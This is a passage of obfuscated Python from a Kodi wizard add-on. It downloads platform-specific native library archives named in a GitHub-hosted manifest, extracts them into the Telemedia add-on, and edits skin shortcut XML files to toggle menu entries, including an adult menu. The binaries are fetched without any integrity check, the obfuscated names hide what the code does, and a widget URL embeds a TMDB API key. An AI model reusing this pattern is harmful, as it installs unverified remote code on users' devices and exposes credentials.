    import sys #line:3348
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.requests/lib')#line:3349
    sys .path .append (OO000OOO00OOO0O0O )#line:3350
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.urllib3/lib')#line:3351
    sys .path .append (OO000OOO00OOO0O0O )#line:3352
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.chardet/lib')#line:3353
    sys .path .append (OO000OOO00OOO0O0O )#line:3354
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.certifi/lib')#line:3355
    sys .path .append (OO000OOO00OOO0O0O )#line:3356
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.idna/lib')#line:3357
    sys .path .append (OO000OOO00OOO0O0O )#line:3358
    OO000OOO00OOO0O0O =translatepath ('special://home/addons/script.module.futures/lib')#line:3359
    sys .path .append (OO000OOO00OOO0O0O )#line:3360
    import requests #line:3361
    import platform #line:3362
    OO0OOOOOOOO0OOOOO =(platform .machine ())#line:3363
    platform =(platform .architecture ())#line:3364
    if sys .platform .lower ().startswith ('linux'):#line:3365
        O0O000O00000O00OO ='linux'#line:3366
        if 'ANDROID_DATA'in os .environ :#line:3367
            O0O000O00000O00OO ='android'#line:3368
    elif sys .platform .lower ().startswith ('win'):#line:3369
        O0O000O00000O00OO ='windows'#line:3370
    elif sys .platform .lower ().startswith ('darwin'):#line:3371
        O0O000O00000O00OO ='darwin'#line:3372
    else :#line:3373
        O0O000O00000O00OO =None #line:3374
    from zipfile import ZipFile #line:3375
    O0000O00OO0O00OO0 =os .path .join (translatepath ("special://home/"),"addons","plugin.video.telemedia")#line:3377
    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'resources','lib')#line:3378
    O0OOO0000O000O000 =requests .get ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json').json ()#line:3379
    if KODI_VERSION <=18 :#line:3380
        OO000OO0OOOO000OO =xbmc .translatePath (ADDON .getAddonInfo ("profile"))#line:3381
    else :#line:3382
        OO000OO0OOOO000OO =xbmcvfs .translatePath (ADDON .getAddonInfo ("profile"))#line:3383
    if force :#line:3384
        download_file ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json',OO000OO0OOOO000OO )#line:3387
        if O0O000O00000O00OO =='android':#line:3388
                if platform [0 ]=='32bit':#line:3389
                    OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android32']#line:3390
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/armeabi-v7a")#line:3391
                    download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3392
                else :#line:3393
                    OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android64']#line:3394
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/arm64-v8a")#line:3395
                    download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3396
        elif O0O000O00000O00OO =='windows':#line:3398
            if platform [0 ]=='64bit':#line:3400
                O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x64')#line:3402
                download_file (O0OOO0000O000O000 ['windows64'],O0000O00OO0O00OO0 )#line:3403
                OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows64.zip')#line:3404
                O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3405
                for OOO0O000OO0OO0OO0 in O0O000O00OO000O00 .infolist ():#line:3409
                    O0O000O00OO000O00 .extract (member =OOO0O000OO0OO0OO0 ,path =O0000O00OO0O00OO0 )#line:3410
                O0O000O00OO000O00 .close ()#line:3411
                time .sleep (1 )#line:3412
                try :#line:3413
                    os .remove (OO000O00O0OO00O0O )#line:3414
                except :#line:3415
                    pass #line:3416
            else :#line:3417
                O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x32')#line:3419
                download_file (O0OOO0000O000O000 ['windows32'],O0000O00OO0O00OO0 )#line:3420
                OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows32.zip')#line:3421
                O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3422
                for OOO0O000OO0OO0OO0 in O0O000O00OO000O00 .infolist ():#line:3426
                    O0O000O00OO000O00 .extract (member =OOO0O000OO0OO0OO0 ,path =O0000O00OO0O00OO0 )#line:3427
                O0O000O00OO000O00 .close ()#line:3428
                time .sleep (1 )#line:3429
                try :#line:3430
                    os .remove (OO000O00O0OO00O0O )#line:3431
                except :#line:3432
                    pass #line:3433
        elif O0O000O00000O00OO =='linux':#line:3434
                if platform [0 ]=='32bit':#line:3436
                    OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux32']#line:3437
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x32")#line:3438
                    download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3439
                else :#line:3440
                    OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux64']#line:3441
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x64")#line:3442
                    download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3443
    else :#line:3444
        OO000OO0O00O0OO00 =os .path .join (OO000OO0OOOO000OO ,'data.json')#line:3445
        if os .path .exists (OO000OO0O00O0OO00 ):#line:3447
            O000O0000000000O0 =open (OO000OO0O00O0OO00 )#line:3449
            O0O000000O0OO0O00 =json .load (O000O0000000000O0 )['Version']#line:3451
            O0OO00000OOOOOOO0 =O0OOO0000O000O000 ['Version']#line:3453
            if version .parse (O0O000000O0OO0O00 )<version .parse (O0OO00000OOOOOOO0 ):#line:3455
                if O0O000O00000O00OO =='android':#line:3458
                    if platform [0 ]=='32bit':#line:3459
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android32']#line:3460
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/armeabi-v7a")#line:3461
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3462
                    else :#line:3463
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android64']#line:3464
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/arm64-v8a")#line:3465
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3466
                elif O0O000O00000O00OO =='windows':#line:3467
                    if platform [0 ]=='64bit':#line:3469
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x64')#line:3471
                        download_file ('https://github.com/vip200/TelemdiaTdlib/blob/main/windows64/windows64.zip?raw=true',O0000O00OO0O00OO0 )#line:3472
                        OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows64.zip')#line:3473
                        O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3474
                    else :#line:3475
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x32')#line:3476
                        download_file ('https://github.com/vip200/TelemdiaTdlib/blob/main/windows32/windows32.zip?raw=true',O0000O00OO0O00OO0 )#line:3477
                        OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows32.zip')#line:3478
                        O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3479
                elif O0O000O00000O00OO =='linux':#line:3480
                        if platform [0 ]=='32bit':#line:3482
                            OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux32']#line:3483
                            O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x32")#line:3484
                            download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3485
                        else :#line:3486
                            OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux64']#line:3487
                            O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x64")#line:3488
                            download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3489
            download_file ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json',OO000OO0OOOO000OO )#line:3490
        else :#line:3491
            download_file ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json',OO000OO0OOOO000OO )#line:3494
            if O0O000O00000O00OO =='android':#line:3495
                    if platform [0 ]=='32bit':#line:3496
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android32']#line:3497
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/armeabi-v7a")#line:3498
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3499
                    else :#line:3500
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['android64']#line:3501
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"android/arm64-v8a")#line:3502
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3503
            elif O0O000O00000O00OO =='windows':#line:3504
                if platform [0 ]=='64bit':#line:3506
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x64')#line:3508
                    download_file (O0OOO0000O000O000 ['windows64'],O0000O00OO0O00OO0 )#line:3509
                    OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows64.zip')#line:3510
                    O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3511
                    for OOO0O000OO0OO0OO0 in O0O000O00OO000O00 .infolist ():#line:3515
                        O0O000O00OO000O00 .extract (member =OOO0O000OO0OO0OO0 ,path =O0000O00OO0O00OO0 )#line:3516
                    O0O000O00OO000O00 .close ()#line:3517
                    time .sleep (1 )#line:3518
                    try :#line:3519
                        os .remove (OO000O00O0OO00O0O )#line:3520
                    except :#line:3521
                        pass #line:3522
                else :#line:3523
                    O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,'windows/x32')#line:3524
                    download_file (O0OOO0000O000O000 ['windows32'],O0000O00OO0O00OO0 )#line:3525
                    OO000O00O0OO00O0O =os .path .join (O0000O00OO0O00OO0 ,'windows32.zip')#line:3526
                    O0O000O00OO000O00 =ZipFile (OO000O00O0OO00O0O )#line:3527
                    for OOO0O000OO0OO0OO0 in O0O000O00OO000O00 .infolist ():#line:3531
                        O0O000O00OO000O00 .extract (member =OOO0O000OO0OO0OO0 ,path =O0000O00OO0O00OO0 )#line:3532
                    O0O000O00OO000O00 .close ()#line:3533
                    time .sleep (1 )#line:3534
                    try :#line:3535
                        os .remove (OO000O00O0OO00O0O )#line:3536
                    except :#line:3537
                        pass #line:3538
            elif O0O000O00000O00OO =='linux':#line:3539
                    if platform [0 ]=='32bit':#line:3541
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux32']#line:3542
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x32")#line:3543
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3544
                    else :#line:3545
                        OOO0O0O000OO0OOOO =O0OOO0000O000O000 ['linux64']#line:3546
                        O0000O00OO0O00OO0 =os .path .join (O0000O00OO0O00OO0 ,"linux/x64")#line:3547
                        download_file (OOO0O0O000OO0OOOO ,O0000O00OO0O00OO0 )#line:3548
def dragon_menu_hub ():#line:3550
        OO0OO0OO0000O0O0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3552
        O0000OO0O00O00000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3553
        OOOO0O0O0OO0O0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1102.DATA.xml")#line:3554
        O0OOOO00000OOOO00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:3555
        if KODI_VERSION <=18 :#line:3557
            OO0OO0O00O0000O00 =open (OO0OO0OO0000O0O0O ,'r')#line:3559
            O0O0O00OOO000OOO0 =OO0OO0O00O0000O00 .read ()#line:3560
            OO0OO0O00O0000O00 .close ()#line:3561
            OO0OO0O00O0000O00 =open (O0000OO0O00O00000 ,'r')#line:3563
            O0O0O00OOO000OOO0 =OO0OO0O00O0000O00 .read ()#line:3564
            OO0OO0O00O0000O00 .close ()#line:3565
            OO0OO0O00O0000O00 =open (OOOO0O0O0OO0O0000 ,'r')#line:3567
            OOO0OOO0OO0O0O000 =OO0OO0O00O0000O00 .read ()#line:3568
            OO0OO0O00O0000O00 .close ()#line:3569
            OO0OO0O00O0000O00 =open (O0OOOO00000OOOO00 ,'r')#line:3571
            OOO0OOO0OO0O0O000 =OO0OO0O00O0000O00 .read ()#line:3572
            OO0OO0O00O0000O00 .close ()#line:3573
        else :#line:3576
            OO0OO0O00O0000O00 =open (OO0OO0OO0000O0O0O ,'r',encoding ='utf-8')#line:3577
            O0O0O00OOO000OOO0 =OO0OO0O00O0000O00 .read ()#line:3578
            OO0OO0O00O0000O00 .close ()#line:3579
            OO0OO0O00O0000O00 =open (O0000OO0O00O00000 ,'r',encoding ='utf-8')#line:3581
            O0O0O00OOO000OOO0 =OO0OO0O00O0000O00 .read ()#line:3582
            OO0OO0O00O0000O00 .close ()#line:3583
            OO0OO0O00O0000O00 =open (OOOO0O0O0OO0O0000 ,'r',encoding ='utf-8')#line:3585
            OOO0OOO0OO0O0O000 =OO0OO0O00O0000O00 .read ()#line:3586
            OO0OO0O00O0000O00 .close ()#line:3587
            OO0OO0O00O0000O00 =open (O0OOOO00000OOOO00 ,'r',encoding ='utf-8')#line:3589
            OOO0OOO0OO0O0O000 =OO0OO0O00O0000O00 .read ()#line:3590
            OO0OO0O00O0000O00 .close ()#line:3591
        O0O0O00OOO000OOO0 =O0O0O00OOO000OOO0 .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		</shortcut>''')#line:3610
        OOO0OOO0OO0O0O000 =OOO0OOO0OO0O0O000 .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''')#line:3626
        if KODI_VERSION <=18 :#line:3627
            OO0OO0O00O0000O00 =open (OO0OO0OO0000O0O0O ,'w')#line:3628
            OO0OO0O00O0000O00 .write (O0O0O00OOO000OOO0 )#line:3629
            OO0OO0O00O0000O00 .close ()#line:3630
            OO0OO0O00O0000O00 =open (O0000OO0O00O00000 ,'w')#line:3632
            OO0OO0O00O0000O00 .write (O0O0O00OOO000OOO0 )#line:3633
            OO0OO0O00O0000O00 .close ()#line:3634
            OO0OO0O00O0000O00 =open (OOOO0O0O0OO0O0000 ,'w')#line:3636
            OO0OO0O00O0000O00 .write (OOO0OOO0OO0O0O000 )#line:3637
            OO0OO0O00O0000O00 .close ()#line:3638
            OO0OO0O00O0000O00 =open (O0OOOO00000OOOO00 ,'w')#line:3640
            OO0OO0O00O0000O00 .write (OOO0OOO0OO0O0O000 )#line:3641
            OO0OO0O00O0000O00 .close ()#line:3642
        else :#line:3644
            OO0OO0O00O0000O00 =open (OO0OO0OO0000O0O0O ,'w',encoding ='utf-8')#line:3645
            OO0OO0O00O0000O00 .write (O0O0O00OOO000OOO0 )#line:3646
            OO0OO0O00O0000O00 .close ()#line:3647
            OO0OO0O00O0000O00 =open (O0000OO0O00O00000 ,'w',encoding ='utf-8')#line:3649
            OO0OO0O00O0000O00 .write (O0O0O00OOO000OOO0 )#line:3650
            OO0OO0O00O0000O00 .close ()#line:3651
            OO0OO0O00O0000O00 =open (OOOO0O0O0OO0O0000 ,'w',encoding ='utf-8')#line:3653
            OO0OO0O00O0000O00 .write (OOO0OOO0OO0O0O000 )#line:3654
            OO0OO0O00O0000O00 .close ()#line:3655
            OO0OO0O00O0000O00 =open (O0OOOO00000OOOO00 ,'w',encoding ='utf-8')#line:3657
            OO0OO0O00O0000O00 .write (OOO0OOO0OO0O0O000 )#line:3658
            OO0OO0O00O0000O00 .close ()#line:3659
def sex_menu_luck (notify =''):#line:3660
        if notify =='true':#line:3661
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוסתר[/COLOR]"%COLOR2 )#line:3662
        wiz .setS ('sex','false')#line:3663
        O00O000OO000O00OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3664
        OO00O000O00OO0OO0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3665
        if KODI_VERSION <=18 :#line:3668
            OOO00000OOO00OOO0 =open (O00O000OO000O00OO ,'r')#line:3670
            OOO000OOOOO0O0O00 =OOO00000OOO00OOO0 .read ()#line:3671
            OOO00000OOO00OOO0 .close ()#line:3672
            OOO00000OOO00OOO0 =open (OO00O000O00OO0OO0 ,'r')#line:3674
            OOO000OOOOO0O0O00 =OOO00000OOO00OOO0 .read ()#line:3675
            OOO00000OOO00OOO0 .close ()#line:3676
        else :#line:3679
            OOO00000OOO00OOO0 =open (O00O000OO000O00OO ,'r',encoding ='utf-8')#line:3680
            OOO000OOOOO0O0O00 =OOO00000OOO00OOO0 .read ()#line:3681
            OOO00000OOO00OOO0 .close ()#line:3682
            OOO00000OOO00OOO0 =open (OO00O000O00OO0OO0 ,'r',encoding ='utf-8')#line:3684
            OOO000OOOOO0O0O00 =OOO00000OOO00OOO0 .read ()#line:3685
            OOO00000OOO00OOO0 .close ()#line:3686
        OOO000OOOOO0O0O00 =OOO000OOOOO0O0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/18purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/18purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''')#line:3705
        if KODI_VERSION <=18 :#line:3707
            OOO00000OOO00OOO0 =open (O00O000OO000O00OO ,'w')#line:3708
            OOO00000OOO00OOO0 .write (OOO000OOOOO0O0O00 )#line:3709
            OOO00000OOO00OOO0 .close ()#line:3710
            OOO00000OOO00OOO0 =open (OO00O000O00OO0OO0 ,'w')#line:3712
            OOO00000OOO00OOO0 .write (OOO000OOOOO0O0O00 )#line:3713
            OOO00000OOO00OOO0 .close ()#line:3714
        else :#line:3716
            OOO00000OOO00OOO0 =open (O00O000OO000O00OO ,'w',encoding ='utf-8')#line:3717
            OOO00000OOO00OOO0 .write (OOO000OOOOO0O0O00 )#line:3718
            OOO00000OOO00OOO0 .close ()#line:3719
            OOO00000OOO00OOO0 =open (OO00O000O00OO0OO0 ,'w',encoding ='utf-8')#line:3721
            OOO00000OOO00OOO0 .write (OOO000OOOOO0O0O00 )#line:3722
            OOO00000OOO00OOO0 .close ()#line:3723
def sex_menu_open ():#line:3725
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]הופעל[/COLOR]"%COLOR2 )#line:3727
        wiz .setS ('sex','true')#line:3728
        O0O0O0OOOO0OO00O0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3729
        O00OO0OO000O00000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3730
        if KODI_VERSION <=18 :#line:3733
            OO00OOOOOO0OOOO00 =open (O0O0O0OOOO0OO00O0 ,'r')#line:3735
            OO00O00O0O00OOO00 =OO00OOOOOO0OOOO00 .read ()#line:3736
            OO00OOOOOO0OOOO00 .close ()#line:3737
            OO00OOOOOO0OOOO00 =open (O00OO0OO000O00000 ,'r')#line:3739
            OO00O00O0O00OOO00 =OO00OOOOOO0OOOO00 .read ()#line:3740
            OO00OOOOOO0OOOO00 .close ()#line:3741
        else :#line:3744
            OO00OOOOOO0OOOO00 =open (O0O0O0OOOO0OO00O0 ,'r',encoding ='utf-8')#line:3745
            OO00O00O0O00OOO00 =OO00OOOOOO0OOOO00 .read ()#line:3746
            OO00OOOOOO0OOOO00 .close ()#line:3747
            OO00OOOOOO0OOOO00 =open (O00OO0OO000O00000 ,'r',encoding ='utf-8')#line:3749
            OO00O00O0O00OOO00 =OO00OOOOOO0OOOO00 .read ()#line:3750
            OO00OOOOOO0OOOO00 .close ()#line:3751
        OO00O00O0O00OOO00 =OO00O00O0O00OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/18purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/18purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''')#line:3770
        if KODI_VERSION <=18 :#line:3772
            OO00OOOOOO0OOOO00 =open (O0O0O0OOOO0OO00O0 ,'w')#line:3773
            OO00OOOOOO0OOOO00 .write (OO00O00O0O00OOO00 )#line:3774
            OO00OOOOOO0OOOO00 .close ()#line:3775
            OO00OOOOOO0OOOO00 =open (O00OO0OO000O00000 ,'w')#line:3777
            OO00OOOOOO0OOOO00 .write (OO00O00O0O00OOO00 )#line:3778
            OO00OOOOOO0OOOO00 .close ()#line:3779
        else :#line:3781
            OO00OOOOOO0OOOO00 =open (O0O0O0OOOO0OO00O0 ,'w',encoding ='utf-8')#line:3782
            OO00OOOOOO0OOOO00 .write (OO00O00O0O00OOO00 )#line:3783
            OO00OOOOOO0OOOO00 .close ()#line:3784
            OO00OOOOOO0OOOO00 =open (O00OO0OO000O00000 ,'w',encoding ='utf-8')#line:3786
            OO00OOOOOO0OOOO00 .write (OO00O00O0O00OOO00 )#line:3787
            OO00OOOOOO0OOOO00 .close ()#line:3788
def tv_widget_mando (notify =''):#line:3789
        if notify =='true':#line:3790
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]הוידגט הוגדר להרחבה מאנדו[/COLOR]"%COLOR2 )#line:3791
            xbmc .executebuiltin ("ActivateWindow(home)")#line:3792
        wiz .setS ('tele_widget','false')#line:3793
        wiz .setS ('mando_widget','true')#line:3794
        O000OOOOO0OO00O00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","skin.Premium.mod.properties")#line:3795
        if KODI_VERSION <=18 :#line:3798
            OOO000OO00000OO00 =open (O000OOOOO0OO00O00 ,'r')#line:3800
            OO0O00000O00O00O0 =OOO000OO00000OO00 .read ()#line:3801
            OOO000OO00000OO00 .close ()#line:3802
        else :#line:3805
            OOO000OO00000OO00 =open (O000OOOOO0OO00O00 ,'r',encoding ='utf-8')#line:3806
            OO0O00000O00O00O0 =OOO000OO00000OO00 .read ()#line:3807
            OOO000OO00000OO00 .close ()#line:3808
        OO0O00000O00O00O0 =OO0O00000O00O00O0 .replace ('''plugin://plugin.video.telemedia/?mode=14&iconimage=special://home/addons/plugin.video.telemedia/tele/Tv_Show/popular_tv.png&fanart=special://home/addons/plugin.video.telemedia/tele/tv_fanart.png&description=%D7%A1%D7%93%D7%A8%D7%95%D7%AA+%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99%D7%95%D7%AA&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A1%D7%93%D7%A8%D7%95%D7%AA+%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99%D7%95%D7%AA&image_master=&heb_name=+&last_id=&dates= &data= &original_title= &id= &season= &episode= &tmdbid= &eng_name= &show_original_year= &isr=0&fav_status=false&groups_id=0&video_data=%7B%22title%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22label%22%3A+%22+%22%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22imdbnumber%22%3A+%22+%22%2C+%22imdbid%22%3A+%22+%22%2C+%22year%22%3A+%22+%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22dateadded%22%3A+%22+00%3A00%3A00%22%7D&video_data=%7B%22title%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22label%22%3A+%22+%22%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22imdbnumber%22%3A+%22+%22%2C+%22imdbid%22%3A+%22+%22%2C+%22year%22%3A+%22+%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e1%5Cu05d3%5Cu05e8%5Cu05d5%5Cu05ea+%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%5Cu05d5%5Cu05ea%22%2C+%22dateadded%22%3A+%22+00%3A00%3A00%22%7D&reload=$INFO[Window(Home).Property(widgetreload-movies)]''','''plugin://plugin.video.mando/?mode=14&iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fpopular.png&fanart=https%3A%2F%2Fi.pinimg.com%2F236x%2F1c%2F49%2F8f%2F1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg&description=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&image_master=&heb_name=+&last_id=&dates=+&data=+&original_title=+&id=+&season=+&episode=+&tmdbid=+&eng_name=+&show_original_year=+&isr=0&fav_status=false&search_db=&iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fpopular.png&fanart=https%3A%2F%2Fi.pinimg.com%2F236x%2F1c%2F49%2F8f%2F1c498f196ef8818d3d01223b72678fc4--divergent-movie-poster-divergent-.jpg&description=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&url=https%3A%2F%2Fapi.themoviedb.org%2F3%2Fdiscover%2Ftv%2F%3Fapi_key%3D34142515d9d23817496eeb4ff1d223d0%26language%3Dhe%26sort_by%3Dpopularity.desc%26include_null_first_air_dates%3Dfalse%26with_original_language%3Den%26page%3D1&name=%D7%A4%D7%95%D7%A4%D7%95%D7%9C%D7%A8%D7%99&image_master=&heb_name=+&last_id=&dates=+&data=+&original_title=+&id=+&season=+&episode=+&tmdbid=+&eng_name=+&show_original_year=+&fav_status=false&search_db=&video_data=%7B%22title%22%3A+%22%5Cu05e4%5Cu05d5%5Cu05e4%5Cu05d5%5Cu05dc%5Cu05e8%5Cu05d9%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+